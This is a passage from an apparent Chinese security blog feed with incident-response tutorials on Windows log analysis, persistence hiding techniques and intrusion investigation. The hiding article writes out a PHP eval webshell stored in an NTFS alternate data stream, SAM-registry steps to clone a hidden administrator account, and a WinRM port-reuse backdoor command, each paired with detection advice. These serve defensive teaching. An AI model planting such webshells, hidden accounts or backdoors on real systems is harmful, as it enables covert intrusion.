        <content type="html"><![CDATA[<h2 id="第1篇-Windows日志分析">第1篇:Windows日志分析</h2><h3 id="0x01-Windows事件日志简介">0x01 Windows事件日志简介</h3><p>Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。</p><p>Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。</p><p><strong>系统日志</strong></p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由Windows NT/<span class="number">2000</span>操作系统预先定义。</span><br><span class="line"></span><br><span class="line">默认位置： %<span class="params">System</span>Root%\<span class="params">System</span>32\Winevt\Logs\<span class="params">System</span>.evtx</span><br></pre></td></tr></table></figure><p><strong>应用程序日志</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。 </span><br><span class="line"></span><br><span class="line">默认位置：%SystemRoot%\System32\Winevt\Logs\Application.evtx</span><br></pre></td></tr></table></figure><p><strong>安全日志</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。</span><br><span class="line"></span><br><span class="line">默认位置：%SystemRoot%\System32\Winevt\Logs\Security.evtx</span><br></pre></td></tr></table></figure><p>​系统和应用程序日志存储着故障排除信息，对于系统管理员更为有用。 安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么，对于调查人员而言，更有帮助。</p><h3 id="0X02-审核策略与事件查看器">0X02 审核策略与事件查看器</h3><p>Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用 ，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p><p>PS：默认状态下，也会记录一些简单的日志，日志默认大小20M</p><p><strong>设置1</strong>：开始 → 管理工具 → 本地安全策略 → 本地策略 → 审核策略，参考配置操作：</p><p><img src="https://gitee.com/eviden/img/raw/master/log-1-1.png" alt=""></p><p><strong>设置2</strong>：设置合理的日志属性，即日志最大大小、事件覆盖阀值等：</p><p><img src="https://gitee.com/eviden/img/raw/master/log-1-2.png" alt=""></p><p><strong>查看系统日志方法：</strong></p><ol><li><p>在**“开始”<strong>菜单上，依次指向</strong>“所有程序”<strong>、</strong>“管理工具”<strong>，然后单击</strong>“事件查看器”**</p></li><li><p>按 “<strong>Window+R</strong>”，输入 ”<strong>eventvwr.msc</strong>“ 也可以直接进入“<strong>事件查看器</strong>”</p><p><img src="https://gitee.com/eviden/img/raw/master/log-1-3.png" alt=""></p></li></ol><h3 id="0x03-事件日志分析">0x03 事件日志分析</h3><p>对于Windows事件日志分析，不同的EVENT ID代表了不同的意义，摘录一些常见的安全事件的说明：</p><table><thead><tr><th style="text-align:left">事件ID</th><th>说明</th></tr></thead><tbody><tr><td style="text-align:left">4624</td><td>登录成功</td></tr><tr><td style="text-align:left">4625</td><td>登录失败</td></tr><tr><td style="text-align:left">4634</td><td>注销成功</td></tr><tr><td style="text-align:left">4647</td><td>用户启动的注销</td></tr><tr><td style="text-align:left">4672</td><td>使用超级用户（如管理员）进行登录</td></tr><tr><td style="text-align:left">4720</td><td>创建用户</td></tr></tbody></table><p>每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式：</p><table><thead><tr><th style="text-align:left">登录类型</th><th>描述</th><th>说明</th></tr></thead><tbody><tr><td style="text-align:left">2</td><td>交互式登录（Interactive）</td><td>用户在本地进行登录。</td></tr><tr><td style="text-align:left">3</td><td>网络（Network）</td><td>最常见的情况就是连接到共享文件夹或共享打印机时。</td></tr><tr><td style="text-align:left">4</td><td>批处理（Batch）</td><td>通常表明某计划任务启动。</td></tr><tr><td style="text-align:left">5</td><td>服务（Service）</td><td>每种服务都被配置在某个特定的用户账号下运行。</td></tr><tr><td style="text-align:left">7</td><td>解锁（Unlock）</td><td>屏保解锁。</td></tr><tr><td style="text-align:left">8</td><td>网络明文（NetworkCleartext）</td><td>登录的密码在网络上是通过明文传输的，如FTP。</td></tr><tr><td style="text-align:left">9</td><td>新凭证（NewCredentials）</td><td>使用带/Netonly参数的RUNAS命令运行一个程序。</td></tr><tr><td style="text-align:left">10</td><td>远程交互，（RemoteInteractive）</td><td>通过终端服务、远程桌面或远程协助访问计算机。</td></tr><tr><td style="text-align:left">11</td><td>缓存交互（CachedInteractive）</td><td>以一个域用户登录而又没有域控制器可用</td></tr></tbody></table><p>关于更多EVENT ID，详见微软官方网站上找到了“Windows Vista 和 Windows Server 2008 中的安全事件的说明”。</p><blockquote><p>原文链接 ：<a href="https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008">https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008</a></p></blockquote><p>案例1：可以利用eventlog事件来查看系统账号登录情况：</p><ol><li><p>在**“开始”<strong>菜单上，依次指向</strong>“所有程序”<strong>、</strong>“管理工具”<strong>，然后单击</strong>“事件查看器”**；</p></li><li><p>在事件查看器中，单击**“安全”**，查看安全日志；</p></li><li><p>在安全日志右侧操作中，点击**“筛选当前日志”**，输入事件ID进行筛选。</p><p>4624  --登录成功<br>4625  --登录失败<br>4634 – 注销成功<br>4647 – 用户启动的注销<br>4672 – 使用超级用户（如管理员）进行登录</p></li></ol><p>我们输入事件ID：4625进行日志筛选，发现事件ID：4625，事件数175904，即用户登录失败了175904次，那么这台服务器管理员账号可能遭遇了暴力猜解。</p><p><img src="https://gitee.com/eviden/img/raw/master/log-1-4.png" alt=""></p><p>案例2：可以利用eventlog事件来查看计算机开关机的记录：</p><p>1、在**“开始”<strong>菜单上，依次指向</strong>“所有程序”<strong>、</strong>“管理工具”<strong>，然后单击</strong>“事件查看器”**；</p><p>2、在事件查看器中，单击**“系统”**，查看系统日志；</p><p>3、在系统日志右侧操作中，点击**“筛选当前日志”**，输入事件ID进行筛选。</p><p>其中事件ID 6006 ID6005、 ID 6009就表示不同状态的机器的情况（开关机）。<br>6005 信息 EventLog 事件日志服务已启动。(开机)<br>6006 信息 EventLog 事件日志服务已停止。(关机)<br>6009 信息 EventLog 按ctrl、alt、delete键(非正常)关机</p><p>我们输入事件ID：6005-6006进行日志筛选，发现了两条在2018/7/6 17:53:51左右的记录，也就是我刚才对系统进行重启的时间。</p><p><img src="./image/log-1-5.png" alt=""></p><h3 id="0x04-日志分析工具">0x04 日志分析工具</h3><h4 id="Log-Parser">Log Parser</h4><p>Log Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。它可以像使用 SQL 语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。</p><p>Log Parser 2.2下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a></p><p>Log Parser 使用示例：<a href="https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/">https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/</a></p><p><img src="https://gitee.com/eviden/img/raw/master/log-1-6.png" alt=""></p><p><strong>基本查询结构</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Logparser<span class="selector-class">.exe</span> –<span class="selector-tag">i</span>:EVT –o:DATAGRID <span class="string">&quot;SELECT * FROM c:\xx.evtx&quot;</span></span><br></pre></td></tr></table></figure><p><strong>使用Log Parser分析日志</strong></p><p>1、查询登录成功的事件</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">登录成功的所有事件</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;<span class="keyword">SELECT</span> *  <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> EventID=<span class="number">4624</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">指定登录时间范围的事件：</span></span><br><span class="line"><span class="string">LogParser.exe -i:EVT –o:DATAGRID  &quot;</span><span class="keyword">SELECT</span> *  <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> TimeGenerated&gt;<span class="string">&#x27;2018-06-19 23:32:11&#x27;</span> <span class="keyword">and</span> TimeGenerated&lt;<span class="string">&#x27;2018-06-20 23:34:00&#x27;</span> <span class="keyword">and</span> EventID=<span class="number">4624</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">提取登录成功的用户名和IP：</span></span><br><span class="line"><span class="string">LogParser.exe -i:EVT  –o:DATAGRID  &quot;</span><span class="keyword">SELECT</span> EXTRACT_TOKEN(Message,<span class="number">13</span>,<span class="string">&#x27; &#x27;</span>) <span class="keyword">as</span> EventType,TimeGenerated <span class="keyword">as</span> LoginTime,EXTRACT_TOKEN(Strings,<span class="number">5</span>,<span class="string">&#x27;|&#x27;</span>) <span class="keyword">as</span> Username,EXTRACT_TOKEN(Message,<span class="number">38</span>,<span class="string">&#x27; &#x27;</span>) <span class="keyword">as</span> Loginip <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> EventID=<span class="number">4624</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>2、查询登录失败的事件</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">登录失败的所有事件：</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;<span class="keyword">SELECT</span> *  <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> EventID=<span class="number">4625</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">提取登录失败用户名进行聚合统计：</span></span><br><span class="line"><span class="string">LogParser.exe  -i:EVT &quot;</span><span class="keyword">SELECT</span>  EXTRACT_TOKEN(Message,<span class="number">13</span>,<span class="string">&#x27; &#x27;</span>)  <span class="keyword">as</span> EventType,EXTRACT_TOKEN(Message,<span class="number">19</span>,<span class="string">&#x27; &#x27;</span>) <span class="keyword">as</span> <span class="keyword">user</span>,<span class="built_in">count</span>(EXTRACT_TOKEN(Message,<span class="number">19</span>,<span class="string">&#x27; &#x27;</span>)) <span class="keyword">as</span> Times,EXTRACT_TOKEN(Message,<span class="number">39</span>,<span class="string">&#x27; &#x27;</span>) <span class="keyword">as</span> Loginip <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> EventID=<span class="number">4625</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> Message<span class="string">&quot; </span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>3、系统历史开关机记录：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;<span class="keyword">SELECT</span> TimeGenerated,EventID,Message <span class="keyword">FROM</span> c:\<span class="keyword">System</span>.evtx <span class="keyword">where</span> EventID=<span class="number">6005</span> <span class="keyword">or</span> EventID=<span class="number">6006</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h4 id="LogParser-Lizard">LogParser Lizard</h4><p>对于GUI环境的Log Parser Lizard，其特点是比较易于使用，甚至不需要记忆繁琐的命令，只需要做好设置，写好基本的SQL语句，就可以直观的得到结果。</p><p>下载地址：<a href="http://www.lizard-labs.com/log_parser_lizard.aspx">http://www.lizard-labs.com/log_parser_lizard.aspx</a></p><p>依赖包：Microsoft .NET Framework 4 .5，下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=42642">https://www.microsoft.com/en-us/download/details.aspx?id=42642</a></p><p>查询最近用户登录情况：</p><p><img src="https://gitee.com/eviden/img/raw/master/log-1-7.png" alt=""></p><h4 id="Event-Log-Explorer">Event Log Explorer</h4><p>Event Log Explorer是一款非常好用的Windows日志分析工具。可用于查看，监视和分析跟事件记录，包括安全，系统，应用程序和其他微软Windows 的记录被记载的事件，其强大的过滤功能可以快速的过滤出有价值的信息。</p><p>下载地址：<a href="https://event-log-explorer.en.softonic.com/">https://event-log-explorer.en.softonic.com/</a></p><p><img src="./image/log-1-8.png" alt=""></p><p>参考链接：</p><p>Windows日志分析   <a href="https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ">https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第03章：权限维持篇第1篇：Windows权限维持--隐藏篇</title>
      <link href="/posts/143d02f0.html"/>
      <url>/posts/143d02f0.html</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言">0x00 前言</h3><p>攻击者在获取服务器权限后，通常会用一些后门来维持权限，如果你想让你的后门保持的更久些，那么请隐藏好它，使之不易被管理员发现。</p><h3 id="0x01-隐藏文件">0x01 隐藏文件</h3><p><strong>1、利用文件属性</strong></p><p>最简单的一种隐藏文件的方式，文件右键属性，勾选隐藏，点击确定后，在这个文件里看不到刚刚的文件了。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-1.png" alt=""></p><p>如果要让文件显示出来，就点击查看，勾选显示隐藏的文件，文件就显示出来。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-2.png" alt=""></p><p>如何真正隐藏文件？</p><p>使用Attrib +s +a +h +r命令就是把原本的文件夹增加了系统文件属性、存档文件属性、只读文件属性和隐藏文件属性。</p><p><code>attrib +s +a +h +r  D:\test\project\test</code>.txt</p><p>这样就做到了真正的隐藏，不管你是否显示隐藏文件，此文件夹都看不见。</p><p>破解隐藏文件：</p><p>打开电脑文件夹选项卡，取消”隐藏受保护的操作系统文件“勾选，把”隐藏文件和文件夹“下面的单选选择“显示隐藏的文件、文件夹和驱动器”。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-3.png" alt=""></p><p><strong>2、利用ADS隐藏文件内容</strong></p><p>​在服务器上echo一个数据流文件进去，比如index.php是网页正常文件，我们可以这样子搞：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> ^<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;chopper&#x27;</span>]);?^&gt; &gt; index.php:hidden.jpg</span><br></pre></td></tr></table></figure><p>这样子就生成了一个不可见的shell hidden.jpg，常规的文件管理器、type命令，dir命令、del命令发现都找不出那个hidden.jpg的。</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">问题<span class="number">1</span>：如何查看<span class="keyword">index</span>.php:hidden.jpg内容呢？</span><br><span class="line"></span><br><span class="line">　　进入文件所在目录，notepad <span class="keyword">index</span>.php:hidden.jpg    或者 dir /r</span><br><span class="line">　　</span><br><span class="line">问题<span class="number">2</span>：如何删除<span class="keyword">index</span>.php:hidden.jpg？</span><br><span class="line"></span><br><span class="line">     直接删除<span class="keyword">index</span>.php即可</span><br></pre></td></tr></table></figure><p><strong>3、驱动级文件隐藏</strong></p><p>驱动隐藏我们可以用过一些软件来实现，软件名字叫：Easy File Locker</p><p>下载链接： <a href="http://www.xoslab.com/efl.html">http://www.xoslab.com/efl.html</a></p><p>如果你在网站目录未查找到相关文件，且系统目录存在存在以下文件：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="name">c</span>:\WINDOWS\xlkfs.dat</span><br><span class="line"><span class="name">c</span>:\WINDOWS\xlkfs.dll</span><br><span class="line"><span class="name">c</span>:\WINDOWS\xlkfs.ini</span><br><span class="line"><span class="name">c</span>:\WINDOWS\system32\drivers\xlkfs.sys</span><br></pre></td></tr></table></figure><p>那么你，应该是遭遇了驱动级文件隐藏。</p><p>如何清除？</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、查询服务状态： <span class="keyword">sc</span> qc xlkfs</span><br><span class="line">2、停止服务： <span class="keyword">net</span> stop xlkfs 服务停止以后，经驱动级隐藏的文件即可显现</span><br><span class="line">3、删除服务： <span class="keyword">sc</span> delete xlkfs</span><br><span class="line">4、删除系统目录下面的文件，重启系统，确认服务已经被清理了。</span><br></pre></td></tr></table></figure><p>隐藏文件的方式还有很多，比如伪装成一个系统文件夹图标，利用畸形文件名、保留文件名无法删除，甚至取一个与系统文件很像的文件名并放在正常目录里面，很难辨别出来。</p><p>这些隐藏文件的方式早已不再是秘密，而更多的恶意程序开始实现“无文件”攻击，这种方式极难被发现。</p><h3 id="0x02-隐藏账号">0x02 隐藏账号</h3><p>window 隐藏系统用户操作，CMD命令行下，建立了一个用户名为“test$”，密码为“abc123!”的简单隐藏账户,并且把该隐藏账户提升为了管理员权限。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-4.png" alt=""></p><p>PS:CMD命令行使用&quot;net user&quot;,看不到&quot;test$&quot;这个账号，但在控制面板和本地用户和组是可以显示此用户的。</p><p>克隆账号制作过程：</p><p>1、“开始”→“运行”，输入“regedt32.exe”后回车,需要到“HKEY_LOCAL_MACHINE\SAM\SAM”，单机右建权限，把名叫：administrator的用户给予：完全控制以及读取的权限，在后面打勾就行，然后关闭注册表编辑器，再次打开即可。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-5.png" alt=""></p><p>2、来到注册表编辑器的“HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names”处，点击test$用户，得到在右边显示的键值中的“类型”一项显示为0x3ec，找到箭头所指目录。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-6.png" alt=""></p><p>3、找到administrator所对应的的项为“000001F4”，将“000001F4”的F值复制到“000003EC”的F值中，保存。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-7.png" alt=""></p><p>4、分别test$和“000003EC导出到桌面，删除test$用户   net user test$ /del</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-8.png" alt=""></p><p>5、将刚才导出的两个后缀为.reg的注册表项导入注册表中。这样所谓的隐藏账户就创建好了。PS：不管你是在命令提示符下输入net user 或者在系统用户管理界面都是看不到test$这个账户的，只有在注册表中才能看得到。</p><p>检测和清理方法：</p><p>使用D盾_web查杀工具，使用克隆账号检测功能进行查看，可检测出隐藏、克隆账号。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-9.png" alt=""></p><h3 id="0x03-端口复用">0x03 端口复用</h3><p>通过端口复用来达到隐藏端口的目的，在Window下，如何实现端口复用呢？</p><p>前阵子，@Twi1ight公布了一种基于内置系统服务的端口复用后门方法，利用WinRM服务，一条命令实现端口复用后门：</p><p><code>winrm set winrm/config/service @&#123;EnableCompatibilityHttpListener=&quot;true&quot;&#125;</code></p><p>一般开启WinRM服务作为远程管理，但还是第一次听到可以作为端口复用，一种简单容易实现的端口复用方式。假设，攻击者已获取到administrator账号密码，连接远程WinRM服务执行命令：</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-19.png" alt=""></p><p>当执行这条命令的同时，将在安全日志中留下痕迹，</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-20.png" alt=""></p><p>另外，可以通过代码实现端口复用重定向，工具：<a href="https://github.com/crabkun/Switcher">https://github.com/crabkun/Switcher</a></p><h3 id="0x04-进程注入">0x04 进程注入</h3><p>进程注入，一直是病毒木马的惯用手段，同时，它也是一种隐藏技术。在常见的渗透测试框架中，进程注入是怎么做的以及我们如何通过工具排查出来？</p><p><strong>1、meterpreter会话注入</strong></p><p>当前权限无法获取hash值，查看目前系统进程</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-10.png" alt=""></p><p>通过migrate将进程注入到system进程后，成功获得hash值。</p><p><img src="./image/privilege-1-11.png" alt=""></p><p>Window后门排查：</p><p>通过TCPview显示已建立的TCP连接，我们可以看到异常的连接，同时，恶意软件将以绿色显示不到一秒钟，然后变成红色消失，如此循环。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-12.png" alt=""></p><p><strong>2、Empire会话进程注入</strong></p><p>通过psinject模块进行会话注入，直接输入ps选择一个SYSTEM权限的进程PID，使用进程注入模块，来获取权限。如下图：</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-13.png" alt=""></p><p>Window后门排查：利用process monitor或者火绒剑监控进程都可以定位到注入进程。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-14.png" alt=""></p><p><img src="./image/privilege-1-15.png" alt=""></p><p><strong>3、Cobalt Strike进程注入</strong></p><p>选择进程，点击inject，随后选择监听器，点击choose，即可发现Cobaltstrike弹回了目标机的一个新会话，这个会话就是成功注入到某进程的beacon。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-16.png" alt=""></p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-17.png" alt=""></p><p>Window后门排查：利用process monitor捕捉通信过程，有规律的请求取决于sleep设置的间隔。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-18.png" alt=""></p><h3 id="0x05-结束">0x05  结束</h3><p>本文主要介绍了Window下的几种隐藏技术，包括隐藏文件、隐藏账号、端口复用、进程注入等方面的简单实现及其排查技巧。仅作抛砖引玉之用，欢迎留言分享。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第01章：入侵排查篇第1篇：Windows 入侵排查</title>
      <link href="/posts/dd41cd94.html"/>
      <url>/posts/dd41cd94.html</url>
      
        <content type="html"><![CDATA[<h2 id="第1篇：windows-入侵排查">第1篇：windows 入侵排查</h2><h3 id="0x00-前言">0x00 前言</h3><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。</p><p>常见的应急响应事件分类：</p><p>Web 入侵：网页挂马、主页篡改、Webshell</p><p>系统入侵：病毒木马、勒索软件、远控后门</p><p>网络攻击：DDOS 攻击、DNS 劫持、ARP 欺骗</p><p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Windows 服务器入侵排查的思路。</p><h3 id="0x01-入侵排查思路">0x01 入侵排查思路</h3><h4 id="1-1-检查系统账号安全">1.1 检查系统账号安全</h4><p>1、查看服务器是否有弱口令，远程管理端口是否对公网开放。</p><ul><li>检查方法：据实际情况咨询相关服务器管理员。</li></ul><p>2、查看服务器是否存在可疑账号、新增账号。</p><ul><li>检查方法：打开 cmd 窗口，输入 <code>lusrmgr.msc</code> 命令，查看是否有新增/可疑的账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉。</li></ul><p>3、查看服务器是否存在隐藏账号、克隆账号。</p><ul><li><p>检查方法：</p><p>a、打开注册表 ，查看管理员对应键值。</p><p>b、使用D盾_web查杀工具，集成了对克隆账号检测的功能。</p></li></ul><p><img src="https://gitee.com/eviden/img/raw/master/202406131419995.png" alt=""></p><p>4、结合日志，查看管理员登录时间、用户名是否存在异常。</p><ul><li><p>检查方法：</p><p>a、Win+R 打开运行，输入&quot;eventvwr.msc&quot;，回车运行，打开“事件查看器”。</p><p>b、导出 Windows 日志 – 安全，利用微软官方工具 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析。</p></li></ul><p><img src="https://gitee.com/eviden/img/raw/master/sum-1-2.png" alt=""></p><h4 id="1-2-检查异常端口、进程">1.2 检查异常端口、进程</h4><p>1、检查端口连接情况，是否有远程连接、可疑连接。</p><ul><li><p>检查方法：</p><p>a、使用<code>netstat -ano</code> 命令查看目前的网络连接，定位可疑的 ESTABLISHED</p><p>b、根据 netstat 命令定位出的 PID 编号，再通过 tasklist 命令进行进程定位 <code>tasklist  | findstr &quot;PID&quot;</code></p></li></ul><p><img src="https://gitee.com/eviden/img/raw/master/202406131419981.png" alt=""></p><p>2、进程</p><ul><li><p>检查方法：</p><p>a、开始 – 运行 – 输入 <code>msinfo32</code> 命令，依次点击 “软件环境 – 正在运行任务” 就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期以及启动时间等。</p><p>b、打开D盾_web查杀工具，进程查看，关注没有签名信息的进程。</p><p>c、通过微软官方提供的 Process Explorer 等工具进行排查 。</p><p>d、查看可疑的进程及其子进程。可以通过观察以下内容：</p><p>没有签名验证信息的进程<br>没有描述信息的进程<br>进程的属主<br>进程的路径是否合法<br>CPU 或内存资源占用长时间过高的进程</p></li></ul><p>3、小技巧：</p><p>​a、查看端口对应的 PID：<code>netstat -ano | findstr &quot;port&quot;</code></p><p>​b、查看进程对应的 PID：任务管理器 – 查看 – 选择列 – PID 或者 <code>tasklist  | findstr &quot;PID&quot;</code></p><p>​c、查看进程对应的程序位置：</p><p>​任务管理器 – 选择对应进程 – 右键打开文件位置</p><p>​运行输入 <code>wmic</code>，cmd 界面输入 <code>process</code></p><p>​d、<code>tasklist /svc</code>   进程 – PID – 服务</p><p>​e、查看Windows服务所对应的端口：</p><p>​%systemroot%/system32/drivers/etc/services（一般 %systemroot% 就是 C:\Windows 路径）</p><h4 id="1-3-检查启动项、计划任务、服务">1.3 检查启动项、计划任务、服务</h4><p>1、检查服务器是否有异常的启动项。</p><ul><li><p>检查方法：</p><p>a、登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。<br>b、单击开始菜单 &gt;【运行】，输入 <code>msconfig</code>，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。<br>c、单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br></pre></td></tr></table></figure><p>检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</p><p>d、利用安全软件查看启动项、开机时间管理等。</p><p>e、组策略，运行 <code>gpedit.msc</code></p></li></ul><p><img src="https://gitee.com/eviden/img/raw/master/202406131419109.png" alt=""></p><p>2、检查计划任务</p><ul><li><p>检查方法：</p><p>a、单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。</p><p>b、单击【开始】&gt;【运行】；输入 <code>cmd</code>，然后输入 <code>at</code>，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。</p></li></ul><p>3、服务自启动</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入 <code>services.msc</code>，注意服务状态和启动类型，检查是否有异常服务。</li></ul><h4 id="1-4-检查系统相关信息">1.4 检查系统相关信息</h4><p>1、查看系统版本以及补丁信息</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入 <code>systeminfo</code>，查看系统信息。</li></ul><p>2、查找可疑目录及文件</p><ul><li><p>检查方法：</p><p>a、 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Window</span> <span class="number">2003</span>版本 C:\Documents and Settings</span><br><span class="line"><span class="attribute">Window</span> <span class="number">2008</span>R2及以后版本 C:\Users\</span><br></pre></td></tr></table></figure><p>b、单击【开始】&gt;【运行】，输入 